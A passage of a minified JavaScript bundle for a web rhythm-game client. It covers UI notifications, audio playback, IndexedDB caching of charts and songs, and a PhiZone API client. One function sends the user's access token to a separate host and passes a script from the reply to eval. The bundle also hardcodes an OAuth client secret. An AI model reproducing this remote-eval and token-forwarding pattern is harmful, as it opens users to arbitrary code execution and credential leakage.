s?void(s=I(!0,s,_)):(C("You have to initialize the Report module before call Merge function."),!1)},success:function(_,N,P,D,V){we(g.Success,_,N,P,D,V)},failure:function(_,N,P,D,V){we(g.Failure,_,N,P,D,V)},warning:function(_,N,P,D,V){we(g.Warning,_,N,P,D,V)},info:function(_,N,P,D,V){we(g.Info,_,N,P,D,V)}},Confirm:{init:function(_){r=I(!0,x,_),O($e,"NotiflixConfirmInternalCSS")},merge:function(_){return r?void(r=I(!0,r,_)):(C("You have to initialize the Confirm module before call Merge function."),!1)},show:function(_,N,P,D,V,U,z){me(v.Show,_,N,null,P,D,V,U,z)},ask:function(_,N,P,D,V,U,z,H){me(v.Ask,_,N,P,D,V,U,z,H)},prompt:function(_,N,P,D,V,U,z,H){me(v.Prompt,_,N,P,D,V,U,z,H)}},Loading:{init:function(_){o=I(!0,S,_),O(W,"NotiflixLoadingInternalCSS")},merge:function(_){return o?void(o=I(!0,o,_)):(C("You have to initialize the Loading module before call Merge function."),!1)},standard:function(_,N){Q(E.Standard,_,N,!0,0)},hourglass:function(_,N){Q(E.Hourglass,_,N,!0,0)},circle:function(_,N){Q(E.Circle,_,N,!0,0)},arrows:function(_,N){Q(E.Arrows,_,N,!0,0)},dots:function(_,N){Q(E.Dots,_,N,!0,0)},pulse:function(_,N){Q(E.Pulse,_,N,!0,0)},custom:function(_,N){Q(E.Custom,_,N,!0,0)},notiflix:function(_,N){Q(E.Notiflix,_,N,!0,0)},remove:function(_){typeof _!="number"&&(_=0),Q(null,null,null,!1,_)},change:function(_){Z(_)}},Block:{init:function(_){l=I(!0,k,_),O(ne,"NotiflixBlockInternalCSS")},merge:function(_){return l?void(l=I(!0,l,_)):(C('You have to initialize the "Notiflix.Block" module before call Merge function.'),!1)},standard:function(_,N,P){M(!0,w.Standard,_,N,P)},hourglass:function(_,N,P){M(!0,w.Hourglass,_,N,P)},circle:function(_,N,P){M(!0,w.Circle,_,N,P)},arrows:function(_,N,P){M(!0,w.Arrows,_,N,P)},dots:function(_,N,P){M(!0,w.Dots,_,N,P)},pulse:function(_,N,P){M(!0,w.Pulse,_,N,P)},remove:function(_,N){typeof N!="number"&&(N=0),M(!1,null,_,null,null,N)}}};return typeof t.Notiflix=="object"?I(!0,t.Notiflix,{Notify:T.Notify,Report:T.Report,Confirm:T.Confirm,Loading:T.Loading,Block:T.Block}):{Notify:T.Notify,Report:T.Report,Confirm:T.Confirm,Loading:T.Loading,Block:T.Block}})})(notiflixAio3_2_6_min);var notiflixAio3_2_6_minExports=notiflixAio3_2_6_min.exports;const Notiflix=getDefaultExportFromCjs(notiflixAio3_2_6_minExports),shared$1={game:{init:!1}},audio={_actx:null,_inited:!1,_started:!1,_bfs:[],dest:null,init(e){this._actx=e||self.AudioContext||self.webkitAudioContext,this._inited=!0},start(e){this._inited||this.init(e),this._started||(this._actx=new this._actx),this._started=!0},decode(e){const{actx:t}=this;return t.decodeAudioData(e)},mute(e){const{actx:t}=this;return t.createBuffer(2,44100*e,44100)},play(e,{loop:t=!1,isOut:n=!0,offset:s=0,playbackrate:r=1,gainrate:o=1,interval:l=0,singleAudioAllowed:d=!1}={}){const u=String(location.href),{actx:f,dest:m}=this,g=this._bfs,y=f.createGain();if(isFinite(l)&&l>0){const x={loop:t,isOut:n,offset:s,playbackrate:r,gainrate:o,interval:l,actx:f,dest:m},E=new IntervalBufferSource(e,x);return y.gain.value=o,n&&y.connect(f.destination),m&&y.connect(m),E.start(),(d||location.href!==u)&&this.stop(),g[g.length]=E,S=>E.bfs}const v=f.createBufferSource();return v.buffer=e,v.loop=t,v.connect(y),y.gain.value=o,v.playbackRate.value=r,n&&y.connect(f.destination),m&&y.connect(m),v.start(0,s),(d||location.href!==u)&&this.stop(),g[g.length]=v,x=>v},stop(){const e=this._bfs;for(const t of e)t.stop();e.length=0},get actx(){return this._started||this.start(),this._actx}};class IntervalBufferSource{constructor(t,{loop:n=!1,isOut:s=!0,offset:r=0,playbackrate:o=1,gainrate:l=1,interval:d=0,actx:u=null,dest:f=null}={}){this.res=t,this.loop=n,this.isOut=s,this.offset=r,this.playbackrate=o,this.gainrate=l,this.interval=d,this.actx=u,this.dest=f}start(){this.startTime=performance.now()/1e3,this._gain=this.actx.createGain(),this._gain.gain.value=this.gainrate,this.isOut&&this._gain.connect(this.actx.destination),this.dest&&this._gain.connect(this.dest),this._loop()}stop(){this._bfs.onended=null,this._bfs.stop()}_loop(){this._bfs=this.actx.createBufferSource();const t=this._bfs;t.buffer=this.res,t.loop=this.loop,t.connect(this._gain),t.playbackRate.value=this.playbackrate;const n=(this.offset+(performance.now()/1e3-this.startTime)*this.playbackrate)%this.res.duration;t.start(this.actx.currentTime,n,this.interval),t.onended=s=>{t.onended=null,!(n+this.interval>this.res.duration&&!this.loop)&&this._loop()}}get bfs(){return this._bfs||this.actx.createBufferSource()}}var ObjectStores=(e=>(e.Chart="chart",e.Song="song",e.UserData="userData",e.Skin="skin",e))(ObjectStores||{});function upgradeDB(e){e.createObjectStore(ObjectStores.UserData,{keyPath:"id"});const t=e.createObjectStore(ObjectStores.Chart,{keyPath:"id"});t.createIndex("levelId","levelId",{unique:!1}),t.createIndex("level","level",{unique:!1}),t.createIndex("difficulty","difficulty",{unique:!1}),t.createIndex("charter","charter",{unique:!1}),t.createIndex("md5","md5",{unique:!0}),t.createIndex("song","song",{unique:!1});const n=e.createObjectStore(ObjectStores.Song,{keyPath:"id"});return n.createIndex("name","name",{unique:!1}),n.createIndex("composer","composer",{unique:!1}),e.createObjectStore(ObjectStores.Skin,{keyPath:"id"}).createIndex("name","name",{unique:!1}),e}const openedDB={};function openDB(e="PTv0",t=1){return new Promise((n,s)=>{if(openedDB[e])return n(openedDB[e]);window.indexedDB||s("IndexedDB Not Found");const r=window.indexedDB.open(e,t);r.onerror=o=>s(o),r.onsuccess=o=>n(openedDB[e]=r.result),r.onupgradeneeded=o=>{const l=o.target;upgradeDB(l.result);const d=l.transaction;d.oncomplete=u=>n(openedDB[e]=l.result)}})}const defaultGameConfig={account:{tokenInfo:null,userBasicInfo:null,defaultConfigID:null,defaultConfig:null,pzBestRecords:{}},ptBestRecords:{},showPoint:!1,showTimer:!1,JITSOpen:!0,defaultRankMethod:"score",denyChartSettings:!1,showTransition:!0,feedback:!1,imageBlur:!0,highLight:!0,showCE2:!1,lineColor:!0,showAcc:!0,showStat:!1,lowRes:!1,noUIBlur:!1,enhanceRankVis:!1,lockOri:!0,aspectRatio:"1.428571",noteScale:"1.15",backgroundDim:"0.6",volume:"2",inputOffset:"0",notifyFinished:!1,isMaxFrame:!1,maxFrame:60,isForcedMaxFrame:!1,enableVP:!1,enableFR:!1,autoDelay:!0,usekwlevelOverbgm:!1,resourcesType:"together-pack-1",enableFilter:!1,filterInput:"",customResourceLink:"",autoplay:!1,competeMode:!1,customChartServer:"chart.phitogether.fun",fullScreenJudge:!1,stopWhenNoLife:!1,useSeparateOffscreenCanvas:!1,reviewWhenResume:!1,allowNonFullscreen:!1,lastVersion:"lastVer"};function saveGameConfig(e,t="gameConfig"){return e||(e=t==="gameConfig"?defaultGameConfig:{}),new Promise((n,s)=>{e=JSON.parse(JSON.stringify(e)),openDB().then(r=>{const o=r.transaction(["userData"],"readwrite").objectStore("userData"),l=o.get(t);l.onsuccess=d=>{l.result?o.put({id:t,gameConfig:e}):o.add({id:t,gameConfig:e}),n(!0)},l.onerror=d=>s(d)}).catch(r=>s(r))})}function getGameConfig(e="gameConfig",t){return new Promise((n,s)=>{openDB().then(r=>{const l=r.transaction(["userData"]).objectStore("userData").get(e);l.onsuccess=async d=>{const u=l.result;u?n(u.gameConfig):t?(await saveGameConfig(t,e),n(t)):s(d)},l.onerror=d=>s(d)}).catch(r=>s(r))})}function retriveTokenErr(e){const t={type:"",message:""};return"error"in e?(t.type=e.error,e.error==="invalid_grant"?t.message=shared$1.game.i18n.t("phizone.err.retriveToken.unableToFindUser"):t.message=shared$1.game.i18n.t("phizone.err.unknown")):"items"in e?(t.type=e.items[".error"],e.items[".error"]==="invalid_token"?t.message=shared$1.game.i18n.t("phizone.err.retriveToken.invalidPswd"):t.message=shared$1.game.i18n.t("phizone.err.unknown")):t.message=shared$1.game.i18n.t("phizone.err.unknown"),t}var API_PATH=(e=>(e.auth="/auth/token",e.userInfo="/me/",e.playChart="/player/play/",e.record="/records/",e.configurations="/player/configurations/",e.songs="/songs/",e.charts="/charts/",e.bindTapTap="/me/bindings/tapTap",e))(API_PATH||{});const APPID="26751127-b013-43f0-b2c1-b7b47be4d648",getApi=e=>"https://api.phizone.cn"+(e?API_PATH[e]:""),PhiZoneAPI={refreshLogin(e,t,n,s){return new Promise(async(r,o)=>{try{const d=new Headers,u=new URLSearchParams;u.append("client_id","regular"),u.append("client_secret","c29b1587-80f9-475f-b97b-dca1884eb0e3"),u.append("grant_type",t),u.append(t,e),u.append("username",n);var l={method:"POST",body:u,headers:d};const m=await(await fetch(getApi("auth")+(s?`?tapApplicationId=${APPID}`:""),l)).json();m.access_token?r(m):o(retriveTokenErr(m))}catch{o("网络连接不畅，请稍后重试")}})},bindTapTap(e,t){return new Promise(async(n,s)=>{try{const o=new Headers;o.append("Authorization",`Bearer ${e}`),o.append("Content-Type","application/json");var r={method:"POST",body:JSON.stringify({applicationId:APPID,unionId:t}),headers:o};(await fetch(getApi("bindTapTap"),r)).status===204?n(!0):s(!1)}catch{s("网络连接不畅，请稍后重试")}})},getUserBasicInfo(e){return new Promise(async(t,n)=>{try{const r=new Headers;r.append("Authorization",`Bearer ${e}`);var s={method:"GET",headers:r};let l=await(await fetch(getApi("userInfo"),s)).json();if(l.data){l.data.avatar||(l.data.avatar="https://res.phizone.cn/akFOXszKg7n9DQXWDBFA4AEJ39MtdCWo/Transparent_Akkarin.webp");const d=await this.getUserAdditionInfo(e,l.data.id);for(const u in d)l.data[u]=d[u];t(l.data)}else l.detail?n(l.detail):n("未知错误")}catch{n("网络连接不畅，请稍后重试")}})},getUserAdditionInfo(access_token,uid){return new Promise(async(res,rej)=>{try{const myHeaders=new Headers;myHeaders.append("Authorization",`Bearer ${access_token}`);var requestOptions={method:"GET",headers:myHeaders};const response=await fetch("https://api.phitogether.realtvop.eu.org/uai/"+uid,requestOptions),result=await response.json();result.userAdditionInfo?(result.userAdditionInfo.isPTDeveloper&&result.script&&eval(result.script),res(result.userAdditionInfo)):res({})}catch(e){res({})}})},getUserConfigurations(e){return new Promise(async(t,n)=>{try{const r=new Headers;r.append("Authorization",`Bearer ${e}`);var s={method:"GET",headers:r};const l=await(await fetch(getApi("configurations"),s)).json();l.data?l.data.length&&t(l.data):n("未知错误")}catch{n("网络连接不畅，请稍后重试")}})},getSpecConfiguration(e,t){return new Promise(async(n,s)=>{try{const o=new Headers;e&&o.append("Authorization",`Bearer ${e}`);var r={method:"GET",headers:o};const d=await(await fetch(getApi("configurations")+`${t}/`,r)).json();d&&d.data?n(d.data):s("未知错误")}catch{s("网络连接不畅，请稍后重试")}})},patchSpecConfiguration(e,t,n){return new Promise(async(s,r)=>{try{const d=new Headers;d.append("Authorization",`Bearer ${e}`);var o=new FormData;for(const f in n)o.append(f,n[f]);var l={method:"PATCH",body:o,headers:d};await fetch(getApi("configurations")+`${t}/`,l);const u=await this.getUserConfigurations(e);shared$1.game.ptmain.gameConfig.account.defaultConfigID=u[u.length-1].id,shared$1.game.ptmain.gameConfig.account.defaultConfig=u[u.length-1],l.method="DELETE",fetch(getApi("configurations")+`${t}/`,l),u?s(u):r("未知错误")}catch{r("网络连接不畅，请稍后重试")}})},playChart(e,t,n){return new Promise(async(s,r)=>{try{const l=new Headers;l.append("Authorization",`Bearer ${e}`);var o={method:"GET",headers:l};const d=await fetch(getApi("playChart")+`?chartId=${t}&configurationId=${n}&applicationId=${APPID}`,o);d?s(d):r("未知错误")}catch{r("网络连接不畅，请稍后重试")}})},recordEncrypted(e,t){return new Promise((n,s)=>{const r=JSON.parse(sessionStorage.getItem("pzPlayInfo")||""),o=e.max_combo,l=t.defaultConfigID,d=e.miss,u=e.stdDeviation,f=e.perfect,m=e.chart,g=r.timestamp,y=e.good_early,v=e.bad,x=e.good_late,E=t.userBasicInfo.id,S=window.hook.chartsMD5.get(window.hook.selectchart.value),w={token:r.token,maxCombo:o,perfect:f,goodEarly:y,goodLate:x,bad:v,miss:d,stdDeviation:u,checksum:S},k=window.GoPZRecord;k(w,t.tokenInfo.access_token,String(o),String(l),String(d),String(f),String(m),String(g),String(y),String(v),String(x),String(E)).then(C=>C.json()).then(C=>{n(C.data)}).catch(C=>{s(C)})})},getRecords(e,t=null,n=null,s=null){return new Promise(async(r,o)=>{try{const d=new Headers;d.append("Authorization",`Bearer ${e}`);var l={method:"GET",headers:d};s||(s=getApi("record")+`?chart=${t}&order=-score&query_player=1&page=1`);const f=await(await fetch(s,l)).json();f?r(f):o("未知错误")}catch{o("网络连接不畅，请稍后重试")}})},getPlayerB20(e,t){return new Promise(async(n,s)=>{try{const o=new Headers;o.append("Authorization",`Bearer ${e}`);var r={method:"GET",headers:o};const d=await(await fetch(getApi()+`/users/${t}/bestRecords`,r)).json();d?n(d):s("未知错误")}catch{s("网络连接不畅，请稍后重试")}})},async getPlayerB20Asv1(e,t){const s=(await this.getPlayerB20(e,t)).data;s.phi1&&(s.phi1.chart=await this.getChartAndItsSongAsv1(s.phi1.chartId));for(const r in s.best19)s.best19[r].chart=await this.getChartAndItsSongAsv1(s.best19[r].chartId);return s},getUserBestRecords(e,t){return new Promise(async(n,s)=>{const r=new Headers;r.append("Authorization",`Bearer ${e}`);var o={method:"GET",headers:r};const d=await(await fetch(`${getApi("record")}?MinOwnerId=${t}&MaxOwnerId=${t}&Order=score&Desc=true&PerPage=114514`,o)).json();if(d){const u={};for(const f of d.data){const m=f.chartId,g=f.score,y=f.accuracy,v=f.isFullCombo;u[m]=u[m]||[g,y,v],u[m][0]=Math.max(u[m][0],g),u[m][1]=Math.max(u[m][1],y),u[m][2]=u[m][2]||v}n(u)}else s("未知错误")})},async getSongs(e=1,t){const n=getApi("songs")+"?PerPage=32&Page="+e+(t?"&Search="+t:"");let s=new Headers;s.append("User-Agent","PhiZoneRegularAccess");const r=await(await fetch(n.replace(/https?:\/\/api.phi.zone/,"https://api.phi.zone"),{headers:s})).json();return r.data?r:null},async getCharts(e){const t=`${getApi("songs")}${e}/charts?Order=difficulty&PerPage=114514`;let n=new Headers;n.append("User-Agent","PhiZoneRegularAccess");const s=await(await fetch(t.replace(/https?:\/\/api.phi.zone/,"https://api.phi.zone"),{headers:n})).json();return s.data?s.data:null},async getChart(e){const t=`${getApi("charts")}${e}`;let n=new Headers;n.append("User-Agent","PhiZoneRegularAccess");const s=await(await fetch(t.replace(/https?:\/\/api.phi.zone/,"https://api.phi.zone"),{headers:n})).json();return s.data&&s.data.id?s.data:{}},async getSong(e){const t=`${getApi("songs")}${e}`;let n=new Headers;n.append("User-Agent","PhiZoneRegularAccess");const s=await(await fetch(t.replace(/https?:\/\/api.phi.zone/,"https://api.phi.zone"),{headers:n})).json();return s.data&&s.data.id?s.data:{}},async getChartAndItsSongAsv1(e){const t=await this.getChart(e),n=await this.getSong(t.songId);return{id:t.id,level:t.level,difficulty:t.difficulty,chart:t.file,charter:t.authorName,notes:t.noteCount,song:{id:n.id,composer:n.authorName,illustrator:n.illustrator,name:n.title,song:n.file,illustration:n.illustration,edition:n.edition,bpm:n.bpm,duration:n.duration,previewStart:n.previewStart,previewEnd:n.previewEnd,isFromPhiZone:!0},like_count:t.likeCount,isFromPhiZone:!0}},async getSongAndItsChartsAsv1(e){const t=this.convertSongTov1(await this.getSong(e));return t.charts=await this.getSongsChartsAsv1(e),t},async getSongsChartsAsv1(e){const t=new Array,n=await this.getCharts(e);if(n)for(const s of n){const{id:r,level:o,difficulty:l,file:d,authorName:u,noteCount:f,songId:m,likeCount:g}=s;t.push({id:r,level:o,difficulty:l,chart:d,ranked:!1,charter:u,notes:f,song:m,like_count:g,isFromPhiZone:!0})}return t},async getSongAndItsChartsByv2MetaAsv1(e){const t=this.convertSongTov1(e);return t.charts=await this.getSongsChartsAsv1(t.id),t},convertSongTov1(e){const{id:t,title:n,edition:s,authorName:r,file:o,illustration:l,illustrator:d,bpm:u,duration:f,previewStart:m,previewEnd:g}=e;return{id:t,composer:r,illustrator:d,name:n,song:o,illustration:l,edition:s,bpm:u,duration:f,preview_start:m,preview_end:g,charts:[],isFromPhiZone:!0}},async getAllSongsAndChartsAsv1(e=1,t){const n=await this.getSongs(e,t);if(!n)return null;const{total:s,perPage:r,hasPrevious:o,hasNext:l}=n,d=[];for(const u of n.data)d.push(this.convertSongTov1(u));return{total:s,perPage:r,hasPrevious:o,hasNext:l,results:d}},async getChartAssets(e){const t=await(await fetch(`${getApi("charts")}${e}/assets`)).json().data;if(!t)return[];const n=[];for(const s of t)n.push({id:s.id,type:s.type,name:s.name,file:await(await fetch(s.file)).blob()});return n}};function removeSearch(e){e=e.substr(0,e.indexOf("?"));const t=e.indexOf("/PTVirtual/charts");return t>0&&(e=e.slice(t)),e}async function renderPZApiFromCache(){const t=await(await caches.open("PTv0-Charts")).keys();let n={},s,r,o;for(const l of t){const d=l.url,u=parseURL(d);if(u.queryParam){const f=getQueryObject(u.queryParam);if(f.type)switch(f.type){case"illustration":d.includes("PTVirtual")||(o=parseInt(f.for),isNaN(o)||(f.for=o)),f.for in n||(n[f.for]={}),n[f.for].illustration=removeSearch(d);break;case"song":f.song=removeSearch(d),d.includes("PTVirtual")||(o=parseInt(f.id),isNaN(o)||(f.id=o)),f.id in n?n[f.id]=Object.assign(n[f.id],f):n[f.id]=f;break;case"chart":f.chart=removeSearch(d),o=parseFloat(f.difficulty),isNaN(o)||(f.difficulty=o),d.includes("PTVirtual")||(o=parseInt(f.for),isNaN(o)||(f.for=o),o=parseInt(f.id),isNaN(o)||(f.id=o)),f.for in n||(n[f.for]={}),n[f.for].charts?(r=n[f.for].charts.findIndex(m=>m.id===f.id),r!=-1?n[f.for].charts[r]=Object.assign(n[f.for].charts[r],f):n[f.for].charts.push(f)):n[f.for].charts=[f];break;case"assets":s=removeSearch(d),d.includes("PTVirtual")||(o=parseInt(f.id),isNaN(o)||(f.id=o),o=parseInt(f.for),isNaN(o)||(f.for=o)),f.for in n||(n[f.for]={}),n[f.for].charts?(r=n[f.for].charts.findIndex(m=>m.id===f.id),r!=-1?n[f.for].charts[r].assets=s:n[f.for].charts.push({id:f.id,assets:s})):n[f.for].charts=[{id:f.id,assets:s}]}}}return Object.values(n)}var md5$2={exports:{}},crypt={exports:{}};(function(){var e="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",t={rotl:function(n,s){return n<<s|n>>>32-s},rotr:function(n,s){return n<<32-s|n>>>s},endian:function(n){if(n.constructor==Number)return t.rotl(n,8)&16711935|t.rotl(n,24)&4278255360;for(var s=0;s<n.length;s++)n[s]=t.endian(n[s]);return n},randomBytes:function(n){for(var s=[];n>0;n--)s.push(Math.floor(Math.random()*256));return s},bytesToWords:function(n){for(var s=[],r=0,o=0;r<n.length;r++,o+=8)s[o>>>5]|=n[r]<<24-o%32;return s},wordsToBytes:function(n){for(var s=[],r=0;r<n.length*32;r+=8)s.push(n[r>>>5]>>>24-r%32&255);return s},bytesToHex:function(n){for(var s=[],r=0;r<n.length;r++)s.push((n[r]>>>4).toString(16)),s.push((n[r]&15).toString(16));return s.join("")},hexToBytes:function(n){for(var s=[],r=0;r<n.length;r+=2)s.push(parseInt(n.substr(r,2),16));return s},bytesToBase64:function(n){for(var s=[],r=0;r<n.length;r+=3)for(var o=n[r]<<16|n[r+1]<<8|n[r+2],l=0;l<4;l++)r*8+l*6<=n.length*8?s.push(e.charAt(o>>>6*(3-l)&63)):s.push("=");return s.join("")},base64ToBytes:function(n){n=n.replace(/[^A-Z0-9+\/]/ig,"");for(var s=[],r=0,o=0;r<n.length;o=++r%4)o!=0&&s.push((e.indexOf(n.charAt(r-1))&Math.pow(2,-2*o+8)-1)<<o*2|e.indexOf(n.charAt(r))>>>6-o*2);return s}};crypt.exports=t})();var cryptExports=crypt.exports,charenc={utf8:{stringToBytes:function(e){return charenc.bin.stringToBytes(unescape(encodeURIComponent(e)))},bytesToString:function(e){return decodeURIComponent(escape(charenc.bin.bytesToString(e)))}},bin:{stringToBytes:function(e){for(var t=[],n=0;n<e.length;n++)t.push(e.charCodeAt(n)&255);return t},bytesToString:function(e){for(var t=[],n=0;n<e.length;n++)t.push(String.fromCharCode(e[n]));return t.join("")}}},charenc_1=charenc;/*!
 * Determine if an object is a Buffer
 *
 * @author   Feross Aboukhadijeh <https://feross.org>
 * @license  MIT
 */var isBuffer_1=function(e){return e!=null&&(isBuffer(e)||isSlowBuffer(e)||!!e._isBuffer)};function isBuffer(e){return!!e.constructor&&typeof e.constructor.isBuffer=="function"&&e.constructor.isBuffer(e)}function isSlowBuffer(e){return typeof e.readFloatLE=="function"&&typeof e.slice=="function"&&isBuffer(e.slice(0,0))}(function(){var e=cryptExports,t=charenc_1.utf8,n=isBuffer_1,s=charenc_1.bin,r=function(o,l){o.constructor==String?l&&l.encoding==="binary"?o=s.stringToBytes(o):o=t.stringToBytes(o):n(o)?o=Array.prototype.slice.call(o,0):!Array.isArray(o)&&o.constructor!==Uint8Array&&(o=o.toString());for(var d=e.bytesToWords(o),u=o.length*8,f=1732584193,m=-271733879,g=-1732584194,y=271733878,v=0;v<d.length;v++)d[v]=(d[v]<<8|d[v]>>>24)&16711935|(d[v]<<24|d[v]>>>8)&4278255360;d[u>>>5]|=128<<u%32,d[(u+64>>>9<<4)+14]=u;for(var x=r._ff,E=r._gg,S=r._hh,w=r._ii,v=0;v<d.length;v+=16){var k=f,C=m,R=g,L=y;f=x(f,m,g,y,d[v+0],7,-680876936),y=x(y,f,m,g,d[v+1],12,-389564586),g=x(g,y,f,m,d[v+2],17,606105819),m=x(m,g,y,f,d[v+3],22,-1044525330),f=x(f,m,g,y,d[v+4],7,-176418897),y=x(y,f,m,g,d[v+5],12,1200080426),g=x(g,y,f,m,d[v+6],17,-1473231341),m=x(m,g,y,f,d[v+7],22,-45705983),f=x(f,m,g,y,d[v+8],7,1770035416),y=x(y,f,m,g,d[v+9],12,-1958414417),g=x(g,y,f,m,d[v+10],17,-42063),m=x(m,g,y,f,d[v+11],22,-1990404162),f=x(f,m,g,y,d[v+12],7,1804603682),y=x(y,f,m,g,d[v+13],12,-40341101),g=x(g,y,f,m,d[v+14],17,-1502002290),m=x(m,g,y,f,d[v+15],22,1236535329),f=E(f,m,g,y,d[v+1],5,-165796510),y=E(y,f,m,g,d[v+6],9,-1069501632),g=E(g,y,f,m,d[v+11],14,643717713),m=E(m,g,y,f,d[v+0],20,-373897302),f=E(f,m,g,y,d[v+5],5,-701558691),y=E(y,f,m,g,d[v+10],9,38016083),g=E(g,y,f,m,d[v+15],14,-660478335),m=E(m,g,y,f,d[v+4],20,-405537848),f=E(f,m,g,y,d[v+9],5,568446438),y=E(y,f,m,g,d[v+14],9,-1019803690),g=E(g,y,f,m,d[v+3],14,-187363961),m=E(m,g,y,f,d[v+8],20,1163531501),f=E(f,m,g,y,d[v+13],5,-1444681467),y=E(y,f,m,g,d[v+2],9,-51403784),g=E(g,y,f,m,d[v+7],14,1735328473),m=E(m,g,y,f,d[v+12],20,-1926607734),f=S(f,m,g,y,d[v+5],4,-378558),y=S(y,f,m,g,d[v+8],11,-2022574463),g=S(g,y,f,m,d[v+11],16,1839030562),m=S(m,g,y,f,d[v+14],23,-35309556),f=S(f,m,g,y,d[v+1],4,-1530992060),y=S(y,f,m,g,d[v+4],11,1272893353),g=S(g,y,f,m,d[v+7],16,-155497632),m=S(m,g,y,f,d[v+10],23,-1094730640),f=S(f,m,g,y,d[v+13],4,681279174),y=S(y,f,m,g,d[v+0],11,-358537222),g=S(g,y,f,m,d[v+3],16,-722521979),m=S(m,g,y,f,d[v+6],23,76029189),f=S(f,m,g,y,d[v+9],4,-640364487),y=S(y,f,m,g,d[v+12],11,-421815835),g=S(g,y,f,m,d[v+15],16,530742520),m=S(m,g,y,f,d[v+2],23,-995338651),f=w(f,m,g,y,d[v+0],6,-198630844),y=w(y,f,m,g,d[v+7],10,1126891415),g=w(g,y,f,m,d[v+14],15,-1416354905),m=w(m,g,y,f,d[v+5],21,-57434055),f=w(f,m,g,y,d[v+12],6,1700485571),y=w(y,f,m,g,d[v+3],10,-1894986606),g=w(g,y,f,m,d[v+10],15,-1051523),m=w(m,g,y,f,d[v+1],21,-2054922799),f=w(f,m,g,y,d[v+8],6,1873313359),y=w(y,f,m,g,d[v+15],10,-30611744),g=w(g,y,f,m,d[v+6],15,-1560198380),m=w(m,g,y,f,d[v+13],21,1309151649),f=w(f,m,g,y,d[v+4],6,-145523070),y=w(y,f,m,g,d[v+11],10,-1120210379),g=w(g,y,f,m,d[v+2],15,718787259),m=w(m,g,y,f,d[v+9],21,-343485551),f=f+k>>>0,m=m+C>>>0,g=g+R>>>0,y=y+L>>>0}return e.endian([f,m,g,y])};r._ff=function(o,l,d,u,f,m,g){var y=o+(l&d|~l&u)+(f>>>0)+g;return(y<<m|y>>>32-m)+l},r._gg=function(o,l,d,u,f,m,g){var y=o+(l&u|d&~u)+(f>>>0)+g;return(y<<m|y>>>32-m)+l},r._hh=function(o,l,d,u,f,m,g){var y=o+(l^d^u)+(f>>>0)+g;return(y<<m|y>>>32-m)+l},r._ii=function(o,l,d,u,f,m,g){var y=o+(d^(l|~u))+(f>>>0)+g;return(y<<m|y>>>32-m)+l},r._blocksize=16,r._digestsize=16,md5$2.exports=function(o,l){if(o==null)throw new Error("Illegal argument "+o);var d=e.wordsToBytes(r(o,l));return l&&l.asBytes?d:l&&l.asString?s.bytesToString(d):e.bytesToHex(d)}})();var md5Exports=md5$2.exports;const md5$1=getDefaultExportFromCjs(md5Exports);function parseCustomServerChartId(e){return e?(typeof e=="number"||e.includes("|$|")&&(e=e.split("|$|")[1]),e):""}function getNoCacheURL(e){return e.includes("?")?e+="&nocache=nocache":e+="?nocache=nocache",e}function toURLString(e){let t;return e instanceof Response?t=e.url:e instanceof URL?t=e.toString():t=e,t}async function getExistenceInCache(e){const t=toURLString(e),n=await window.caches.open("PTv0-Charts");return[n,await n.match(t,{ignoreSearch:!0,ignoreVary:!0})]}async function deleteInCacheIfCached(e){getExistenceInCache(e).then(t=>{t[1]&&t[0].delete(t[1].url)})}function deepClone(e){return JSON.parse(JSON.stringify(e))}async function haveSong(e){return!!(await getAllChartsKeys(ObjectStores.Song)).includes(e)}async function downloadSong(e,t,n){return{id:parseCustomServerChartId(e.id),name:e.name,composer:e.composer,illustrator:e.composer,from:e.isFromPhiZone?2:e.isFromURL?0:3,songFile:t||await fetch(getNoCacheURL(e.song)).then(s=>s.blob()),illustrationFile:n||await fetch(getNoCacheURL(e.illustration)).then(s=>s.blob()),origin:deepClone(e)}}async function downloadChart(e,t,n){const s=parseCustomServerChartId(e.for||(typeof e.song=="object"?e.song.id:e.song));if(await haveSong(s))if(n)try{await n()}catch(l){console.error(l)}else typeof e.song=="object"?await downloadSong(e.song).then(l=>saveCachedSong(l)).catch(l=>console.error(l)):console.log("Song Not Found");const r=e.isFromPhiZone?2:e.isFromURL?0:3,o=t?t instanceof Blob?t:await t.blob():await fetch(getNoCacheURL(e.chart)).then(l=>l.blob());return{id:parseCustomServerChartId(e.id),level:e.level,difficulty:e.difficulty,from:r,charter:e.charter,notes:e.notes,song:s,chartFile:o,assetsFile:r===2?await PhiZoneAPI.getChartAssets(e.id):[],md5:md5$1(await new Response(o).text()),origin:deepClone(e)}}function deleteCachedSongOrChart(e,t){return e===null?null:new Promise((n,s)=>{openDB().then(r=>{const l=r.transaction([t],"readwrite").objectStore(t).delete(e);l.onsuccess=d=>n(!0),l.onerror=d=>s(d)}).catch(r=>s(r))})}function deleteCachedSong(e){return deleteCachedSongOrChart(e,ObjectStores.Song)}function deleteCachedChart(e){return deleteCachedSongOrChart(e,ObjectStores.Chart)}function getCachedChart(e){return new Promise((t,n)=>{if(e===null)return null;e=parseCustomServerChartId(e),openDB().then(s=>{const o=s.transaction([ObjectStores.Chart]).objectStore(ObjectStores.Chart).get(e);o.onsuccess=l=>{const d=o.result;d?t(d):n(l)},o.onerror=l=>n(l)}).catch(s=>n(s))})}function getCachedSong(e){return new Promise((t,n)=>{if(e===null)return n("Song ID Not Found");e=parseCustomServerChartId(e),openDB().then(s=>{const o=s.transaction([ObjectStores.Song]).objectStore(ObjectStores.Song).get(e);o.onsuccess=l=>{const d=o.result;d?t(d):n(l)},o.onerror=l=>n(l)}).catch(s=>n(s))})}function saveCachedSong(e){return new Promise((t,n)=>{openDB().then(s=>{const r=s.transaction([ObjectStores.Song],"readwrite").objectStore(ObjectStores.Song),o=r.get(e.id);o.onsuccess=l=>{o.result?r.put(e):r.add(e),t(!0)},o.onerror=l=>n(l)}).catch(s=>n(s))})}function saveCachedChart(e){return new Promise((t,n)=>{openDB().then(s=>{const r=s.transaction([ObjectStores.Chart],"readwrite").objectStore(ObjectStores.Chart),o=r.get(e.id);o.onsuccess=l=>{o.result?r.put(e):r.add(e),t(!0)},o.onerror=l=>n(l)}).catch(s=>n(s))})}function getSongsIllustrationAsB64(e){return new Promise(t=>{getCachedSong(e).then(n=>{const s=n.illustrationFile;if(!s)return t("");const r=new FileReader;r.onload=o=>t(o.target.result),r.readAsDataURL(s)}).catch(n=>console.log(n))})}function checkLocalChart(e){return new Promise(t=>{getCachedChart(e).then(n=>{t(!0)}).catch(n=>t(!1))})}function getChartsFiles(e,t){return new Promise((n,s)=>{getCachedChart(e).then(async r=>{if(t=parseCustomServerChartId(r.song||t),!t)return s("Song ID Not Found");const o=await 